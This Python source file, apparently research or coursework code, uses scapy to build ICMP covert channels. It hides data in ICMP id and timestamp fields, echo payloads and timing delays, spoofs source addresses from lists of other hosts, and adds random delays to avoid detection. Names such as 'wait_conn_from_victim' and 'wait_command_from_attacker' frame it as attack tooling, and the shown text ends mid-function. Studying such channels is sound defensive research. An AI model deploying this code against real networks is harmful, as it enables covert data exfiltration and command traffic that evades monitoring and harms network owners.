import sys, datetime, time, os, ipaddress, string, random
from mymethods import *  

from scapy.all import IP, ICMP, Raw, Ether, IPv6, IPerror6, ICMPerror, IPerror
from scapy.all import ICMPv6EchoReply, ICMPv6EchoRequest, ICMPv6ParamProblem, ICMPv6TimeExceeded, ICMPv6PacketTooBig, ICMPv6DestUnreach
from scapy.all import get_if_hwaddr, sendp, sr1, sniff, send, srp1 
from scapy.all import * 
from enum import Enum 
from abc import ABC, abstractmethod 
from check_type import * 
from get_type import * 
from network_methods import *

#ip_google=socket.getaddrinfo("www.google.com", None, socket.AF_UNSPEC)
#print("IP_GOOGLE: ",ip_google)  
def get_filter_connection_from_function(function_name:str=None, ip_src=None, checksum:int=None, ip_dst=None, interface=None): 
    IPv4_ECHO_REQUEST_TYPE=8
    IPv4_ECHO_REPLY_TYPE=0
    IPv6_ECHO_REQUEST_TYPE=128
    IPv6_ECHO_REPLY_TYPE=129 
    if not isinstance(function_name,str):
        raise ValueError(f"La funzione passata non è una stringa: {type(function_name)} {function_name}")
    match function_name:
        #---------------------
        case "wait_conn_from_proxy" | "wait_proxy_update"| "wait_conn_from_victim": 
            if not isinstance(checksum, int):
                raise ValueError(f"Il checksum passato non è un intero: {type(function_name)} {function_name}")
            if not isinstance(ip_src,ipaddress.IPv4Address) and not isinstance(ip_src,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(function_name)} {function_name}")
                
            if ip_src.version==4:
                return f"icmp and icmp[0]==8 and src {ip_src.compressed} and icmp[4:2]={checksum}" 
            elif ip_src.version==6:
                return f"icmp6 and (icmp6[0]=={IPv6_ECHO_REQUEST_TYPE} and src {ip_src.compressed} and icmp[4:2]={checksum}" 
            else: print(f"Caso non contemplato: {ip_src.version}") 
        #---------------------
        case "wait_data_from_proxy" | "wait_conn_from_attacker" | "wait_command_from_attacker": 
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}")
            if not isinstance(ip_src,ipaddress.IPv4Address) and not isinstance(ip_src,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(function_name)} {function_name}")
                
            if ip_src.version==4 and ip_dst.version==4:
                return f"icmp and icmp[0]==8 and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            elif ip_src.version==6 and ip_dst.version==6:
                return f"icmp6 and icmp6[0]==128 and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            else: print(f"Caso non contemplato: {ip_src.version}/{ip_dst.version}")  
        #---------------------
        case "wait_data_from_vicitm":
            if not isinstance(ip_src,ipaddress.IPv4Address) and not isinstance(ip_src,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(function_name)} {function_name}")
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}")

            if ip_src.version==4 and ip_dst.version==4:
                return f"icmp and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            elif ip_src.version==6 and ip_dst.version==6:
                return f"icmp6 and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            else: print(f"Caso non contemplato: {ip_src.version}/{ip_dst.version}") 
        #---------------------
        case "wait_conn_from_proxy":
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}") 
            if not isinstance(checksum, int):
                raise ValueError(f"Il checksum passato non è un intero: {type(function_name)} {function_name}")
                
            if ip_dst.version==4:
                return f"icmp and icmp[0]==8 and dst {ip_dst.compressed} and icmp[4:2]=={checksum}" 
            elif ip_dst.version==6:
                return f"icmp6 and icmp6[0]==128 and dst {ip_dst.compressed} and icmp[4:2]=={checksum}" 
            else: print(f"Caso non contemplato: {ip_src.version}") 
        #---------------------
        case "wait_attacker_command"| "victim_wait_conn_from_proxy" | "wait_icmpEcho_dst": 
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}")
                
            if ip_dst.version==4:
                return f"icmp and icmp[0]=={IPv4_ECHO_REQUEST_TYPE} and dst {ip_dst.compressed}" 
            elif ip_dst.version==6:
                return f"icmp6 and icmp6[0]=={IPv6_ECHO_REQUEST_TYPE} and dst {ip_dst.compressed}" 
            else: print(f"Caso non contemplato: {ip_src.version}") 
        #---------------------
        #case "":
        #    if ip_src.version==4:
        #        return aaa
        #    elif ip_src.version==6:
        #        return aaa
        #    else: print(f"Caso non contemplato: {ip_src.version}") 

class ICMP_TYPE(Enum): 
    v4_DestinationUnreachable=3
    v4_TimeExceeded=11 
    v4_ParameterProblem=12 
    v4_SourceQuench=4 
    v4_Redirect=5 
    v4_Echo_Request=8
    v4_Echo_Reply=0 
    v4_Timestamp_Request=13
    v4_Timestamp_Reply=14
    v4_Information_Request=15
    v4_Information_Reply=16 
    #
    v6_DestinationUnreachable=1
    v6_PacketTooBig=2
    v6_TimeExceeded=3
    v6_ParameterProblem=4
    v6_Echo_Request=128
    v6_Echo_Reply=129  
class SENDER_TYPE(Enum): 
        TRUE_SENDER=1
        FAKE_SENDER_ACTIVE=2 
        FAKE_SENDER_INACTIVE=3
        FAKE_SENDER_BOTH=4 
block_size=1024 #bytes (1KB) 
min_wait=2 #sec
max_wait=15 #sec
DEBUG=True

class SendSingleton: 
    type_attacco=None 
    type_sender=None
    host_attivi=None 
    use_delay=None  
    
    def __init__(self, type_attacco:Enum=None, type_sender:Enum=None, use_delay:bool=False): 
        if not is_enum_member(type_attacco, AttackType): 
            raise Exception("type_attacco non AttackType: ") 
        self.type_attacco=type_attacco  
        if not is_enum_member(type_sender, SENDER_TYPE): 
            raise Exception("type_sender non SENDER_TYPE") 
        self.type_sender=type_sender
        if not is_boolean(use_delay):
            raise Exception("use_delay non boolean") 
        self.use_delay=use_delay
        self.host_attivi=[]
        match self.type_sender: 
            case SENDER_TYPE.TRUE_SENDER: 
                ip,err=IP.find_local_IP()
                if err:
                    raise Exception("Impossibile trovare l'IP locale: ", err)
                self.host_attivi=[ip]
            case SENDER_TYPE.FAKE_SENDER_ACTIVE: 
                active_host= HOST_ATTIVI().active_host  
                for index in range(len(active_host)): 
                    try: 
                        self.host_attivi.append(ipaddress.ip_address(active_host[index]))
                    except ValueError as value_err: 
                        print("Errore:",value_err) 
                print("ATTIVI:",self.host_attivi)
            case SENDER_TYPE.FAKE_SENDER_INACTIVE: 
                inactive_host= HOST_ATTIVI().inactive_host 
                for index in range(len(inactive_host)): 
                    try: 
                        self.host_attivi.append(ipaddress.ip_address(inactive_host[index]))
                    except ValueError as value_err: 
                        print("Errore:",value_err) 
                print("INATTIVI:",self.host_attivi)
            case SENDER_TYPE.FAKE_SENDER_BOTH:
                classe_host= HOST_ATTIVI() 
                classe_host= HOST_ATTIVI() 
                active_host= classe_host.active_host 
                for index in range(len(active_host)): 
                    try: 
                        self.host_attivi.append(ipaddress.ip_address(active_host[index]))
                    except ValueError as value_err: 
                        print("Errore:",value_err) 
                inactive_host= classe_host.inactive_host 
                for index in range(len(inactive_host)): 
                    try: 
                        self.host_attivi.append(ipaddress.ip_address(inactive_host[index]))
                    except ValueError as value_err: 
                        print("Errore:",value_err) 
                print("ATTIVI/INATTIVI:",self.host_attivi)
            case _: raise Exception("Tipo di sender non valido: ", type_sender) 
    
    def check_self_var(self): 
        if not is_enum_member(self.type_attacco, AttackType): 
            raise Exception("type_attacco non valido: ") 
        if not is_enum_member(self.type_sender, SENDER_TYPE): 
            raise Exception("type_sender non valido") 
        if not is_boolean(self.use_delay):
            raise Exception("use_delay non valido")  
        if not is_list(self.host_attivi) or len(self.host_attivi)<=0 or any(not is_ipaddress(ip) for ip in self.host_attivi): 
            raise ValueError("host_attivi non valida")
    
    def send_host_attivi(self, ip_dst:ipaddress.IPv4Address=None): 
        self.check_self_var() 
        if not is_ipaddress(ip_dst): 
            raise Exception("ip_dst: non valido")
        dst_mac=GET_MAC_ADDRESS(ip_dst).mac_address.strip().replace("-",":").lower() 
        if not dst_mac: 
            raise ValueError("dst_mac non valido") 
        default_interface=DEFAULT_INTERFACE().default_iface
        ping_once(ip_dst, default_interface) 
        interface=(
            INTERFACE_FROM_IP(ip_dst).interface or 
            default_interface
        )  
        if not interface: 
            raise ValueError("interface non valida") 
        if DEBUG: 
            print("send_host_attivi: ESECUZIONE DEBUG")
            return
        #----------------------------
        msg=MSG.START_SOURCES.value
        for index in range(len(self.host_attivi)): 
            if not is_ipaddress(self.host_attivi[index]):
                print("Host non valido: ", self.host_attivi[index]) 
                continue 
            indirizzo_IP=self.host_attivi[index].compressed
            if len(msg+indirizzo_IP)>64: 
                #print("MESSAGGIO: ",len(msg),"\t",msg) 
                pkt = ( 
                    Ether(dst=dst_mac)
                    / IP(dst=ip_dst.compressed) 
                    / ICMP(type=0, id=23, seq=0)  
                    /Raw(load=(msg).encode()) 
                ) 
                sendp(pkt, verbose=1, iface=interface) 
                msg=MSG.START_SOURCES.value+indirizzo_IP
            else: msg=msg+";"+indirizzo_IP
        #print("MESSAGGIO: ",len(msg),"\t",msg)
        pkt = ( 
            Ether(dst=dst_mac)
            / IP(dst=ip_dst.compressed) 
            / ICMP(type=0, id=23, seq=0)  
            /Raw(load=(msg+MSG.END_SOURCES.value).encode()) 
        ) 
        sendp(pkt, verbose=1, iface=interface) 

    def send_data(self, data:bytes=None, ip_dst:ipaddress.IPv4Address=None):  
        self.check_self_var()
        if not is_bytes(data): 
            raise TypeError("data non byte")
        if not is_ipaddress(ip_dst): 
            raise TypeError("ip_dst non valido")  
        sender=None
        if is_ipaddress(ip_dst) and ip_dst.version==4: 
            match self.type_attacco:
                case AttackType.ipv4_destination_unreachable|AttackType.ipv4_destination_unreachable_unused: 
                    sender=IPV4_DESTINATION_UNRECHABLE(ip_dst, self.host_attivi) 
                case AttackType.ipv4_time_exceeded|AttackType.ipv4_time_exceeded_unused: 
                    sender=IPV4_TIME_EXCEEDED(ip_dst, self.host_attivi) 
                case AttackType.ipv4_parameter_problem|AttackType.ipv4_parameter_problem_unused: 
                    sender=IPV4_PARAMETER_PROBLEM(ip_dst, self.host_attivi) 
                case AttackType.ipv4_source_quench|AttackType.ipv4_source_quench_unused: 
                    sender=IPV4_SOURCE_QUENCH(ip_dst, self.host_attivi) 
                case AttackType.ipv4_redirect: 
                    sender=IPV4_REDIRECT(ip_dst, self.host_attivi)
                case AttackType.ipv4_echo_campi|AttackType.ipv4_echo_payload|AttackType.ipv4_echo_campi_payload|AttackType.ipv4_echo_random_payload: 
                    sender=IPV4_ECHO(ip_dst, self.host_attivi, self.type_attacco) 
                case AttackType.ipv4_timestamp: 
                    sender=IPV4_TIMESTAMP(ip_dst, self.host_attivi)
                case AttackType.ipv4_information: 
                    sender=IPV4_INFORMATION(ip_dst, self.host_attivi)
                case AttackType.ipv4_timing_channel_8bit: 
                    sender=IPV4_TIMING_8BIT(ip_dst, self.host_attivi)
                case AttackType.ipv4_timing_channel_8bit_noise: 
                    sender=IPV4_TIMING_8BIT_NOISE(
                        ip_dst, self.host_attivi, {"min_delay":1, "max_delay":30, "rumore":2, "seed":4582}
                    )
                case _: raise Exception(f"Tipologia non conosciuta: {self.tipologia}") 
        elif is_ipaddress(ip_dst) and ip_dst.version==6: 
            match self.type_attacco: 
                case AttackType.ipv6_echo: 
                    sender=IPV4_ECHO(ip_dst, self.host_attivi)
                case AttackType.ipv6_parameter_problem: 
                    sender=IPV6_PARAMETER_PROBLEM(ip_dst, self.host_attivi)
                case AttackType.ipv6_time_exceeded: 
                    sender=IPV6_TIME_EXCEEDED(ip_dst, self.host_attivi)
                case AttackType.ipv6_packet_to_big: 
                    sender=IPV6_PACKET_BIG(ip_dst, self.host_attivi)
                case AttackType.ipv6_destination_unreachable: 
                    sender=IPV6_DESTINTION_UNREACHABLE(ip_dst, self.host_attivi)
                case AttackType.ipv6_timing_cc:  
                    sender=IPV6_TIMING(ip_dst, self.host_attivi) 
                case _: raise Exception(f"Tipologia non conosciuta: {self.tipologia}") 
        else: raise Exception("IP destinazione non valido: ",ip_dst)
        self.send_host_attivi(ip_dst) 
        for i in range(0, len(data), block_size): 
            ip_src=ipaddress.ip_address(random.choice(self.host_attivi)) if self.host_attivi else None
            print("IP_SRC:",ip_src)
            if self.use_delay: 
                print("#"*10+"\n"+"#"*10+"\n"+"#"*10+"\n"+"#"*10+"\n"+"#"*10+"\n")
                print("Waiting...")
                time.sleep(random.uniform(min_wait,max_wait)) 
            try:
                sender.send(data[i:i+block_size],self.type_attacco,ip_src) 
            except Exception as e: 
                print("send data IPV4: ",e) 
        sender.send_last()

class ReceiveSingleton:  
    attacco=None 
    ip_dst=None
    host_attivi=None 
    stop_flag={"value":False} 
    wait_class=None

    def __init__(self, attacco:Enum=None): 
        if not is_enum_member(attacco, AttackType): 
            raise TypeError("attacco non valido")  
        self.attacco=attacco  
        self.ip_dst,err=IP.find_local_IP() 
        if err or not is_ipaddress(self.ip_dst): 
            print(err)
            raise Exception(f"ip_dst non valido") 
        self.wait_host_attivi() 
        if not is_list(self.host_attivi) or len(self.host_attivi)<=0 or any(not is_ipaddress(ip) for ip in self.host_attivi): 
            raise ValueError("host_attivi non valido")
        if self.ip_dst.version==4: 
            match self.attacco: 
                case AttackType.ipv4_information: 
                    self.wait_class=IPV4_INFORMATION(self.ip_dst, self.host_attivi) 
                case AttackType.ipv4_timestamp: 
                    self.wait_class=IPV4_TIMESTAMP(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_redirect: 
                    self.wait_class=IPV4_REDIRECT(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_source_quench | AttackType.ipv4_source_quench_unused: 
                    self.wait_class=IPV4_SOURCE_QUENCH(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_parameter_problem | AttackType.ipv4_parameter_problem_unused: 
                    self.wait_class=IPV4_PARAMETER_PROBLEM(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_time_exceeded | AttackType.ipv4_time_exceeded_unused: 
                    self.wait_class=IPV4_TIME_EXCEEDED(self.ip_dst, self.host_attivi) 
                case AttackType.ipv4_destination_unreachable | AttackType.ipv4_destination_unreachable_unused: 
                    self.wait_class=IPV4_DESTINATION_UNRECHABLE(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_echo_campi|AttackType.ipv4_echo_payload|AttackType.ipv4_echo_campi_payload|AttackType.ipv4_echo_random_payload: 
                    self.wait_class=IPV4_ECHO(self.ip_dst, self.host_attivi, self.attacco)
                case AttackType.ipv4_timing_channel_8bit: 
                    self.wait_class=IPV4_TIMING_8BIT(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_timing_channel_8bit_noise: 
                    self.wait_class=IPV4_TIMING_8BIT_NOISE(
                        self.ip_dst, 
                        self.host_attivi, 
                        {"min_delay":1, "max_delay":30, "rumore":2, "seed":4582}
                    ) 
                case _: raise Exception(f"ReceiveSingleton: tipologia non conosciuta: {self.attacco}")
        elif self.ip_dst.version==6: 
            match self.attacco: 
                case AttackType.ipv6_echo:  
                    self.wait_class=IPV6_ECHO(self.ip_dst, self.host_attivi)
                case AttackType.ipv6_parameter_problem: 
                    self.wait_class=IPV6_PARAMETER_PROBLEM(self.ip_dst, self.host_attivi)
                case AttackType.ipv6_time_exceeded: 
                    self.wait_class=IPV6_TIME_EXCEEDED(self.ip_dst, self.host_attivi)
                case AttackType.ipv6_packet_to_big: 
                    self.wait_class=IPV6_PACKET_BIG(self.ip_dst, self.host_attivi)
                case AttackType.ipv6_destination_unreachable: 
                    self.wait_class=IPV6_DESTINTION_UNREACHABLE(self.ip_dst, self.host_attivi) 
                case _: raise Exception(f"ReceiveSingleton: Tipologia non conosciuta: {self.attacco}")
        else:
            raise Exception(f"ReceiveSingleton: versione IP non conosciuta: {self.ip_dst.version}") 
        if not isinstance(self.wait_class, _IPx): 
            raise TypeError("wait_class non valida") 
    
    def check_self_var(self):  
        if not is_enum_member(self.attacco, AttackType): 
            raise TypeError("attacco non valido") 
        #if not is_list(self.host_attivi) or len(self.host_attivi)<=0 or any(not is_ipaddress(ip) for ip in self.host_attivi): 
        #    raise ValueError("host_attivi non valida") 
        if not is_ipaddress(self.ip_dst): 
            raise TypeError("ip_dst non valido")  
        #if not isinstance(self.wait_class, _IPx): 
        #    raise TypeError("wait_class non valida") 
    
    def get_callback(self): 
        def callback(pkt):  
            print("Pacchetto ricevuto: ", pkt.summary())  
            if pkt.haslayer("ICMP") and pkt.haslayer("Raw") and (pkt["ICMP"].type==8 or pkt["ICMP"].type==0): 
                if pkt[ICMP].id==23 and MSG.START_SOURCES.value.encode() in pkt["Raw"].load: 
                    if MSG.END_SOURCES.value.encode() in pkt["Raw"].load: 
                        self.stop_flag["value"]=True 
                    IPsources=pkt["Raw"].load.decode()
                    IPsources=IPsources.replace(MSG.START_SOURCES.value,"")
                    IPsources=IPsources.replace(MSG.END_SOURCES.value,"")
                    IPsources=IPsources.strip().split(";") 
                    for x in IPsources: 
                        try:
                            ipSRC=ipaddress.ip_address(x)
                            if ipSRC.version==self.ip_dst.version: 
                                self.host_attivi.append(ipSRC) 
                            else: 
                                print("IP versione non corretta: ",self.ip_dst.version," ", ipSRC)
                        except Exception as e:
                            print("Errore nell'aggiunta degli host attivi: ", e)
            elif pkt.haslayer("Padding"):
                print("Padding load: ", pkt["Padding"].load) 
        return callback 
    
    def wait_host_attivi(self):  
        def get_filter(): 
            TYPE_ECHO_REQUEST=ICMP_TYPE.v4_Echo_Request if self.ip_dst.version==4 else ICMP_TYPE.v6_Echo_Request
            TYPE_ECHO_REPLY=ICMP_TYPE.v6_Echo_Reply if self.ip_dst.version==4 else ICMP_TYPE.v6_Echo_Reply 
            str_icmp="icmp" if self.ip_dst.version==4 else "icmp6"
            filter=str_icmp
            filter=filter+f" and ({str_icmp}[0]=={TYPE_ECHO_REQUEST} or {str_icmp}[0]=={TYPE_ECHO_REPLY})"
            filter=filter+f" and dst {self.ip_dst.compressed}" 
            return filter 
        def get_stop_filter(): 
            def stop_filter(pkt): 
                return self.stop_flag["value"] 
            return stop_filter 
        self.check_self_var()
        if (DEBUG): 
            print("wait_host_attivi: ESECUZIONE DEBUG")
            self.host_attivi=[ipaddress.ip_address("192.168.1.15")] 
            if not is_list(self.host_attivi) or len(self.host_attivi)<=0 or any(not is_ipaddress(ip) for ip in self.host_attivi): 
                raise ValueError("host_attivi non valida") 
            return
        print("In ascolto dei pacchetti ICMP...")
        sniff( 
            filter=get_filter()
            ,prn=self.get_callback()
            ,store=False 
            ,stop_filter=get_stop_filter() 
        ) 
        #print("Host attivi trovati: ", self.host_attivi) 
        if not is_list(self.host_attivi) or len(self.host_attivi)<=0 or any(not is_ipaddress(ip) for ip in self.host_attivi): 
            raise ValueError("host_attivi non valida") 

class _IPx: 
    ip_dst=None
    dst_mac=None
    #ip_src=None 
    #src_mac=None 
    interface=None 
    
    data=[] 
    host_attivi=None 
    #event_pktconn=get_threading_Event() 
    stop_flag={"value":False}  
    stop_integer:int=255
    time_timeout=60 #sec

    def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:list[ipaddress.IPv4Address]=None):
        if not is_ipaddress(ip_dst) :   
            raise TypeError("IP di destinazione non corretto") 
        self.ip_dst=ip_dst  
        self.dst_mac=GET_MAC_ADDRESS(ip_dst).mac_address
        #print(f"MAC destinazione: {self.dst_mac}")
        if not self.dst_mac: 
            raise ValueError(f"dst_mac non valido") 
        default_interface=DEFAULT_INTERFACE().default_iface
        ping_once(ip_dst, default_interface)
        self.interface=(
            INTERFACE_FROM_IP(ip_dst).interface or 
            default_interface
        ) 
        if not self.interface: 
            raise ValueError(f"interface non valida") 
        #print(f"Interfaccia per destinazione: {self.interface}")
        if not is_list(host_attivi) or len(host_attivi)<=0 or any( not is_ipaddress(ip_host) for ip_host in host_attivi):
            raise Exception("Lista degli indiirzzi host non valida") 
        self.host_attivi=host_attivi 
        #print("Host Attivi: ",self.host_attivi)  
    
    def check_self_var(self):  
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version not in [4,6]:   
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac: 
            raise ValueError(f"dst_mac non valido") 
        if not self.interface: 
            raise ValueError(f"interface non valida")  
        if not is_list(self.host_attivi) or len(self.host_attivi)<=0 or any( not is_ipaddress(ip_host) for ip_host in self.host_attivi):
            raise ValueError("host_attivi non valida") 
        if not is_list(self.data): 
            raise TypeError("data non valido") 
        if not is_integer(self.stop_integer): 
            raise TypeError("stop_integer non valido") 
        if not is_dictionary(self.stop_flag) or not is_boolean(self.stop_flag["value"]): 
            raise TypeError("stop_flag non valido")   

    def get_stop_filter(self): 
        def stop_filter(pkt): 
            nonlocal self
            return self.stop_flag["value"] 
        return stop_filter 

    def timeout_timer_callback(self): 
        if not is_dictionary(self.stop_flag) or not is_boolean(self.stop_flag["value"]): 
            raise TypeError("stop_flag non valido")  
        #THREADING_EVENT.set(self.event_pktconn) 
        self.stop_flag["value"]=True  
    
    @staticmethod
    def get_filter(type_list:list[Enum]=None, ip_dst:ipaddress.IPv4Address=None, host_attivi:list[ipaddress.IPv4Address]=None): 
        if not is_list(type_list) or len(type_list)<=0 or any(not is_enum_member(x,ICMP_TYPE) for x in type_list): 
            raise TypeError("type_list non valido")
        if not is_ipaddress(ip_dst) or ip_dst.version not in [4,6]: 
            raise TypeError("ip_dst non valido") 
        if not is_list(host_attivi) or len(host_attivi)<=0 or any(not is_ipaddress(x) for x in host_attivi): 
            raise TypeError("host_attivi non valido")
        if ip_dst.version==4: 
            str_icmp="icmp"
        elif ip_dst.version==6: 
            str_icmp="icmp6"
        filter=str_icmp 
        #Parte che agiunge le tipologie in ascolot
        filter=filter+f" and ("
        for index in range(len(type_list)): 
            if index>0:  filter=filter+f" or {str_icmp}[0]={type_list[index].value} "
            else: filter=filter+f" {str_icmp}[0]={type_list[index].value} "
        filter=filter+f")" 
        filter=filter+f" and dst host {ip_dst.compressed}"   
        #Parte che aggiunge le tipologie in ascolto
        filter+=f" and ("
        for index in range(len(host_attivi)): 
            if not is_ipaddress(host_attivi[index]): 
                #print(f"get_filter: host non valido {host_attivi[index]}")
                continue
            if index>0:  filter+=f" or src host {host_attivi[index].compressed} "
            else: filter+=f" src host {host_attivi[index].compressed}" 
        filter+=f")"  
        print("FILTER:",filter)
        return filter

    @abstractmethod 
    def get_callback(self):
        raise NotImplementedError(f"Non si è sovrascritto il metodo get_callback: {self.__class__.__name__}")

    def wait(self, type_list:list[Enum]=None): 
        self.data=[]
        self.check_self_var()  
        if not is_list(type_list) or len(type_list)<=0 or any(not is_enum_member(x,ICMP_TYPE) for x in type_list): 
            raise TypeError("type_list non valido")  
        print("In ascolto dei pacchetti...")
        sniff(
            filter=self.get_filter(
                type_list,
                self.ip_dst, 
                self.host_attivi
            ),
            prn=self.get_callback(),
            store=False ,
            stop_filter=self.get_stop_filter(),
            timeout=self.time_timeout 
        )  
        self.check_data()
    
    def check_data(self):  
        #self.data="".join(x for x in self.data)  
        joined="".join(self.data) 
        cleaned="".join(x for x in joined if x in string.printable) 
        self.data=cleaned 
        #print("DATI WIAT:",self.data) 

    def _old_wait(self, type_list:list[int]=None): 
        if not is_ipaddress(self.ip_dst): 
            raise Exception(f"IPV4_: indirizzo destinazione non valido")  
        if not is_list(self.data): 
            raise Exception(f"IPV4_: lista dati non valida") 
        if not is_list(type_list): 
            raise Exception(f"IPV4_: lista tipologie non valida") 
        try: 
            args={
                "filter": self.get_filter(
                    type_list,
                    self.ip_dst, 
                    self.host_attivi
                )
                #,"count":1 
                ,"prn": self.get_callback()
                #,"store":True 
                ,"iface":self.interface
            }
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None 
                ,lambda: SNIFFER.template_timeout(self.event_pktconn)
            )  
        except Exception as e:
            raise Exception(f"{self.__class__.__name__} wait: {e}")
        try: 
            THREADING_EVENT.wait(self.event_pktconn) 
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(self.data)
                cleaned="".join(x for x in joined if x in string.printable) 
                self.data=cleaned 
                return True 
            return False 
        except Exception as e:
            raise Exception(f"IPV4_.wait: {e}")

    @abstractmethod 
    def send(self, data:bytes=None, type_attacco:Enum=None): 
        pass 

    @abstractmethod 
    def send_last(self): 
        pass

class IPV4_INFORMATION(_IPx): 
    INFORMATION_REQ=ICMP_TYPE.v4_Information_Request
    INFORMATION_REP=ICMP_TYPE.v4_Information_Reply

    def get_callback(self):
        def callback(packet): 
            nonlocal self 
            if packet.haslayer(IP) and packet.haslayer(ICMP) and (packet[ICMP].type==self.INFORMATION_REQ.value or packet[ICMP].type==self.INFORMATION_REP.value): 
                if packet[ICMP].id==self.stop_integer and packet[ICMP].seq==self.stop_integer: 
                    #THREADING_EVENT.set(self.event_pktconn)
                    self.stop_flag["value"]=True 
                    return 
                icmp_id=packet[ICMP].id
                byte1 = (icmp_id >> 8) & 0xFF 
                byte2 = icmp_id & 0xFF  
                self.data.extend([chr(byte1),chr(byte2)]) 
                #print(f"Callback received: {byte1} / {byte2}")
                #print(f"Callback received: {chr(byte1)} / {chr(byte2)}")
        return callback

    def wait(self):
        super().wait([self.INFORMATION_REQ, self.INFORMATION_REP]) 
    
    def send(self, data:bytes=None, type_attacco:Enum=None, ip_src:ipaddress.IPv4Address=None): 
        #def ipv4_information(self, data:bytes=None): 
        if not is_bytes(data):
            raise Exception(f"data non byte") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=4: 
            raise Exception("ip_dst non valido") 
        if not self.dst_mac:
            self.dst_mac = GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=INTERFACE_FROM_IP(self.ip_dst).interface
        if not is_ipaddress(ip_src) or ip_src.version!=4: #ip_src:ipaddress.IPv4Address=None
            raise Exception("ip_src non valido",ip_src) 
        for index in range(0, len(data), 2): 
            if index==len(data)-1 and len(data)%2!=0:
                icmp_id=(data[index]<<8)
            else:
                icmp_id=(data[index]<<8)+data[index+1] 
            pkt= Ether(dst=self.dst_mac) \
                /IP(src=ip_src, dst=self.ip_dst.compressed) \
                /ICMP(type=self.INFORMATION_REP,id=icmp_id)
            #pkt.summary()
            #pkt.show() 
            sendp(pkt, verbose=1, iface=self.interface) 
    
    def send_last(self): 
        pkt= Ether(dst=self.dst_mac) \
            /IP(dst=self.ip_dst.compressed)\
            /ICMP(type=self.INFORMATION_REP,
                  id=self.stop_integer,seq=self.stop_integer)
        #pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface)
    
class IPV4_TIMESTAMP(_IPx):  
    TIMESTAMP_REQ=ICMP_TYPE.v4_Timestamp_Request
    TIMESTAMP_REP=ICMP_TYPE.v4_Timestamp_Reply 
    
    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if packet.haslayer(IP) and packet.haslayer(ICMP) and (packet[ICMP].type==self.TIMESTAMP_REQ.value or packet[ICMP].type==self.TIMESTAMP_REP.value):  
                if packet[ICMP].id==self.stop_integer and packet[ICMP].seq==self.stop_integer: 
                    #THREADING_EVENT.set(self.event_pktconn)
                    self.stop_flag["value"]=True 
                    return
                icmp_id=packet[ICMP].id 
                byte1 = (icmp_id >> 8) & 0xFF 
                byte2 = icmp_id & 0xFF  
                self.data.extend([chr(byte1),chr(byte2)]) 
                #
                icmp_ts_ori=str(packet[ICMP].ts_ori)[-3:]  
                icmp_ts_rx=str(packet[ICMP].ts_rx)[-3:]  
                icmp_ts_tx=str(packet[ICMP].ts_tx)[-3:] 
                self.data.extend([chr(int(icmp_ts_ori)),chr(int(icmp_ts_rx)), chr(int(icmp_ts_tx))]) 
        return callback

    def wait(self):
        super().wait([self.TIMESTAMP_REQ, self.TIMESTAMP_REP])  
    
    def send(self, data:bytes=None, type_attacco:Enum=None, ip_src:ipaddress.IPv4Address=None):  
        if not is_bytes(data): 
            raise Exception("data non validi")
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception(f"ip_dst non corretto") 
        if not self.dst_mac:
            self.dst_mac = GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=INTERFACE_FROM_IP(self.ip_dst).interface  
        if not is_ipaddress(ip_src) or ip_src.version!=4:  
            raise Exception("ip_src non valido",ip_src)  
        for index in range(0, len(data), 5): 
            try:
                icmp_id=icmp_id=(data[index]<<8)+data[index+1]  
            except IndexError as e: 
                icmp_id=(data[index]<<8)
            
            current_time=datetime.now(timezone.utc) 
            midnight = current_time.replace(hour=0, minute=0, second=0, microsecond=0) 

            data_pkt=int.from_bytes(data[index+2:index+3]) *10**3 
            #print("Tempo prima: ",current_time)
            current_time=current_time.replace(microsecond=data_pkt) 
            #print("Tempo dopo: ",current_time)
            icmp_ts_ori=int((current_time - midnight).total_seconds() * 1000) 
            #print("Tempo campo: ",icmp_ts_ori) 
            #print("Dati nasocsti: ",data[index+2:index+3],"\t",int.from_bytes(data[index+2:index+3])) 
            #print("Dati nasocsti: ",data[index+3:index+4],"\t",int.from_bytes(data[index+3:index+4]))
            #print("Dati nasocsti: ",data[index+4:index+5],"\t",int.from_bytes(data[index+4:index+5]))

            data_pkt=int.from_bytes(data[index+3:index+4]) *10**3
            if current_time.second+1<60:
